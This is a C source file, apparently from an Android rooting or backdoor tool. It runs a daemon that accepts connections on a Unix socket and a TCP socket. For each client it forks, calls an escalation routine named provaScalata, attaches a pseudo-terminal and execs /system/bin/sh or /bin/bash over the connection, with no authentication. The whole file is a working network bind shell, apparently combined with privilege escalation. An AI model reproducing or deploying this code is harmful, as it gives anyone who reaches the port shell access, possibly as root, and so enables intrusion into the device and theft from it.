
#include "daemon.h"

#include <limits.h> //PATH_MAX


#include <sys/select.h>

#include <stdlib.h>
#include <sys/socket.h>
#include <unistd.h> //close
#include "utils.h"
#include <fcntl.h> //O_RDWR
#include "pts.h"
#include <stdio.h>
#include <sys/ioctl.h>

#include <termios.h> 

int unix_daemon_create(int argc,char**argv);
int unix_daemon_handle(int);

int tcp_daemon_create(int argc,char**argv);
int tcp_daemon_handle(int);


typedef int   (*HandlerPointer_t)(int);

#define TYPE_UNIX 1
#define TYPE_TCP 2

struct HandlersStruct_s
{

		int fd;
		int type;
};



void replace_standard_streams(int fd)
{
	dup2(fd, 2);
	dup2(fd, 1);
	dup2(fd, 0);
	close(fd);
}

static int try_using_pty(int fd)
{
	int master_ptx, slave_ptx; 
	char name_buffer[PATH_MAX];
	master_ptx = posix_openpt(O_RDWR| O_NOCTTY); 
	if (master_ptx < 0) 
		return fd; 
	if(grantpt(master_ptx))
		return fd; 
	if(unlockpt(master_ptx))
		return fd;

	ptsname_r(master_ptx,name_buffer,PATH_MAX-1);
	char*nm = name_buffer;
	slave_ptx  = open(nm, O_RDWR); 

	if(slave_ptx < 0)
		goto errore1;

	int cpid = fork();
	if(cpid < 0)
		goto errore2;

	if(cpid == 0)
	{
		struct termios slave_orig_term_settings; // Saved terminal settings 
		struct termios new_term_settings; // Current terminal settings 

		close(master_ptx); 

		  // Save the default parameters of the slave side of the PTY 

		  setsid();
			 set_stdin_raw(slave_ptx);

		  tcgetattr(slave_ptx, &slave_orig_term_settings); 
		  new_term_settings = slave_orig_term_settings;

		  new_term_settings.c_oflag &= ~(ONLCR| OCRNL | ONLRET|ONLRET);

		  new_term_settings.c_lflag |= ISIG;

		  tcsetattr (slave_ptx, TCSANOW, &new_term_settings);	 

		  ioctl(slave_ptx, TIOCSCTTY, 1);
		  return slave_ptx;
	}
	else
	{

		close(slave_ptx);
		replace_standard_streams(fd);
		struct winsize w;
        	if (ioctl(master_ptx, TIOCGWINSZ, &w) != -1) {
		w.ws_col = 60;
	        ioctl(master_ptx, TIOCSWINSZ, &w);

	        }

        // Set the new terminal size

		pump_streams_sync(0,master_ptx,master_ptx,1);

		exit(0);
	}
	/* master terminal now */

errore2:
	close(slave_ptx);
errore1:

	close(master_ptx);
	return fd;
}

static int start_daemon(int type, int clientFd)
{
	provaScalata();

	int fd = try_using_pty(clientFd);
	replace_standard_streams(fd);

	//execl("/data/local/bin/busybox", "/data/local/bin/busybox", "sh" ,  NULL);
	execl("/system/bin/sh", "/system/bin/sh", NULL);
	execl("/bin/bash", "/bin/bash", NULL);

	return -1;
}





static int create_daemons(struct HandlersStruct_s* daemonStructs, int ssize, int argc,char**argv)
{

	int un_fd;

	unsigned int numHandlers = 0;
	un_fd = unix_daemon_create(argc,argv);
	if(un_fd >= 0)
	{
		struct HandlersStruct_s tmp;
		tmp.type = TYPE_UNIX;
		tmp.fd = un_fd;
		daemonStructs[numHandlers++] = tmp;
	}

	un_fd = tcp_daemon_create(argc,argv);
	if(un_fd >= 0)
	{
		struct HandlersStruct_s tmp;

		tmp.fd = un_fd;
		tmp.type = TYPE_TCP;
		daemonStructs[numHandlers++] = tmp;

	}

	return numHandlers;
}

static void close_daemons(struct HandlersStruct_s* daemonStructs, int numHandlers)
{
	for(int j = 0; j < numHandlers; j++)
	{
		close(daemonStructs[j].fd);
	}
}

int do_daemon(int argc, char ** argv)
{


	struct HandlersStruct_s handlers[16];

	unsigned int numHandlers = create_daemons(handlers,16,argc,argv);

	if(numHandlers ==  0)
		return -1;

	fd_set rfds;

	while (1)
	{
		int max_fd = 0;
		FD_ZERO(&rfds);
		for(int i = 0; i < numHandlers;i++)
		{
			int curFd = handlers[i].fd;
			if(curFd > max_fd)
				max_fd = curFd;
			FD_SET(curFd,&rfds);
		}

		int retval = select(max_fd+1, &rfds, NULL, NULL, NULL);

		if (retval == -1)
			 goto chiusura;
		if(retval == 0)
			continue;

		for(int i = 0; i < numHandlers; i++)
		{
			int curFd = handlers[i].fd;
			if(!FD_ISSET(curFd,&rfds))
				continue;

			int client = accept(curFd, NULL, NULL);
			if(client < 0)
				goto chiusura;

			if (fork_zero_fucks() == 0) {
				close_daemons(handlers,numHandlers);
				return start_daemon(handlers[i].type,client);
			}
			else {
				close(client);

			}
		}
	}

chiusura:
	close_daemons(handlers,numHandlers);

	return 0;
}
